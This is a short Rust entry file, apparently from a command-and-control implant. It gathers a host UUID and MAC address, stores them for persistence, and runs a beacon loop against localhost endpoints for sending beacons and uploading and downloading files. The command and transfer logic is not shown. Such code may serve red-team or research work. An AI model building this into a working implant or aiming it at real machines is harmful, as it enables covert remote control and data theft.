mod beacon;
mod commands;
mod sysinfo;
mod utils;

const UPLOAD_URL: &str = "http://localhost:5000/api/v1/files";
const DOWNLOAD_URL: &str = "http://localhost:5000/api/v1/send_file";
const BEACON_URL: &str = "http://localhost:5000/api/v1/beacon";

#[tokio::main]
async fn main() {
    // Retrieve system information and UUID, which is saved in a file for persistence
    let (uuid, mac_addr) = sysinfo::saver::save_file().expect("Error saving file");

    // Run the main loop to send beacons and receive commands
    beacon::sender::run(uuid, mac_addr, BEACON_URL, UPLOAD_URL, DOWNLOAD_URL).await;
}
